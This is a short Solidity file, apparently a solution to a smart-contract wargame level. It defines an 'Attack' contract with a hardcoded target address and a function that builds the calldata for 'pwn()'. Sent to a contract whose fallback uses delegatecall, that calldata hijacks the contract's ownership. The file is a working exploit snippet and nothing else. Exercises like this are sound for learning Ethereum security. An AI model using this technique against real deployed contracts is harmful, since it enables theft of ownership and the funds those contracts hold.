// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;


interface Delegate {
    function pwn() external;
}
contract Attack {

    address Delegation = 0x1d798064313aD574c01D979358D19Ab2Ca53609f;

    function attack() public pure returns(bytes memory){
       return abi.encodeWithSignature("pwn()");
    }

}